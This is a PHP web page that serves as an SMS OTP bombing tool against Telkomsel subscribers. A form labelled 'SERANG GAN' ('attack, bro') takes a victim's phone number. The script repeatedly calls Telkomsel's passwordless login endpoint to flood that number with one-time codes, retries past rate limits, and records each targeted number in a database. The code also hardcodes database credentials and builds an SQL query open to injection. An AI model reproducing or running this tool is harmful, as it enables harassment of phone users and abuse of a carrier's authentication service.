<?php
include "db.php";
if(isset($_POST['tembak'])){
$kon2 = mysqli_connect('localhost','animedigi','q1w2e3r4','animedigi');
$no = $_POST['nomer'];
$loop = 10;
for ($x=1; $x<=$loop; $x++) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, "https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_HTTPHEADER, array(
            'Auth0-Client: eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiNy42LjEifQ',
            'Origin: https://my.telkomsel.com',
            'Accept-Encoding: gzip, deflate, br',
            'Accept-Language: en-US,en;q=0.9',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
            'Content-Type: application/x-www-form-urlencoded',
            'Accept: application/json, text/javascripte',
            'Referer: https://my.telkomsel.com/',
            'Connection: keep-alive'
        ));
        curl_setopt($c, CURLOPT_POSTFIELDS,"client_id=Xlj9pkfK6yYumf6G8KE2S5TDWgTtczb0&phone_number=%2B".$no."&connection=sms");
        curl_setopt($c, CURLOPT_POST, 1);
        $hasil = curl_exec($c);
        if ($hasil == "Too Many Requests") {
                $loop += 1;
                 $d   = date('Y-m-d H:i:s');
                 mysqli_query($kon2, "INSERT INTO nomer_orang (id, nomer, tanggal) VALUES (NULL,'$no','$d')");

                $pesan = "Code failed to send :(67s)".($loop-$x)." remaining\n\e[93mSleep in 60s\n";
                flush();
                sleep(60);
        } else {
                $pesan = "Code has been sent :)\n";
                flush();
                sleep(1);
        }
   }
}
?>
<html>
<head>
  <title> Powered by Azhar</title>
</head>
<body>
<h1 align="center">UNTUK TELKOMSEL</h1>
<?php if(isset($pesan)){
        echo "<h1>".$pesan."</h1>";
}?>
<form method="post" action="">
  <tr>
    <td>Nomer:</td><td><input type="text" name="nomer" placeholder="tulis nomenya gengs"></td>
  </tr>
  <input type="submit" name="tembak" value="SERANG GAN">
</form>
<p>Jika Gateway Timeout -tinggal kalian submit ulang lagi ,dan kode spam OTP tetep masuk KO ,See You </p>
</body>
</html>
